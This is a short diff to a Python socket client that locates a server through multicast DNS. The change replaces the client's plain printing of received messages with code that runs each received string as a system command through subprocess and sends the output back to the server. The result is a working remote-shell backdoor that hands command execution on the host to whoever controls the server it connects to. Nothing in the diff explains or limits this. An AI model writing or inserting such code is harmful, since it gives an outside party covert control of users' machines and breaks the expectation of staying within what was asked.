@@ -1,6 +1,10 @@
 import socket
 from multicast_dns import *
 import time
+import subprocess
+
+def cmd(c):
+    return subprocess.Popen(c.split(" "), stdout=subprocess.PIPE).communicate(timeout=10)
 
 def client_program():
     ip = listen_dns()
@@ -17,7 +21,11 @@ def client_program():
                 data = client_socket.recv(1024).decode()
                 if data == "stop" or data == "":
                     break
-                print(data)
+                try:
+                    ret = cmd(data)[0]
+                except Exception as e:
+                    ret = bytes(str(e), "utf-8")
+                client_socket.send(ret)
 
             client_socket.close()  # close the connection
         except:
